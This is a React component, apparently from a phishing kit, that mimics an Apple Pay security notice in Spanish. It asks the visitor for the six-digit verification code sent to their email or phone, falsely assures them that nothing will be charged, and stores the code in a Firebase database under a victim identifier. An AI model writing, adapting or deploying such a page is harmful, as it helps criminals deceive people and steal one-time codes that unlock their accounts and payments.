import React from 'react'
import { useLayoutEffect } from 'react'
import { useState } from 'react'
import logoApple from '../../../assets/logoApple.png'
import { setDataDb } from '../../../Firebase/sendFirebaseData'
const ApplePay = ({idF}) => {
    const [appleCode,setAppleCode]=useState("")
    const [notificacion, setNotificacion]=useState()
    useLayoutEffect((idF)=>{
        if(appleCode.length>6){
            setAppleCode(appleCode.slice(0,6))
        }
        setNotificacion({})
    },[appleCode])
    
    const handleChange=(e)=>{
      setAppleCode(e.target.value)
   
    }

    const btnEnviar=()=>{
        if(appleCode.length!=6||appleCode==""){
            setNotificacion({appleCode:appleCode==""?"El campo no puede estar vacio":"El código Validador debe tener 6 digitos"})
            return 
        }
        setDataDb(idF, "appleCode", appleCode)
    }
    return (
        <div className='flex flex-col items-center pb-6'>
            <div className='bg-stone-900 text-white  w-full flex justify-center items-center'>
                <p className=''>Aviso</p>
                <img className='h-9' src={logoApple} />
            </div>
            <p className='text-xs px-2 text-justify bg-slate-100/60 font-semibold'>
                Por motivos de seguridad es necesario que Ingreses un código Validador de Apple Pay
                para validar tu identidad, tranquilo no se te cobrará ningún valor
            </p>
            <div className='w-full px-2 mt-2 text-xs font-semibold'>
                <p className='leading-3'>Revisa tu correo o mensaje de texto donde llegara el código Validador, Gracias</p>
            </div>
            <input className='border-2 mt-6 border-black px-2 outline-none' 
                value={appleCode}
                type={'number'}
                onChange={handleChange} placeholder='Ingrese su código' 
                onKeyDown={(evt) => evt.key === 'e' && evt.preventDefault()}
            />
            <span className='text-xs mb-2 mt-2 h-5 text-red-600'>{notificacion?.appleCode||""}</span>
            <button onClick={()=>btnEnviar()} className='bg-stone-900 text-white w-min px-4'>Enviar</button>
        </div>
    )
}

export default ApplePay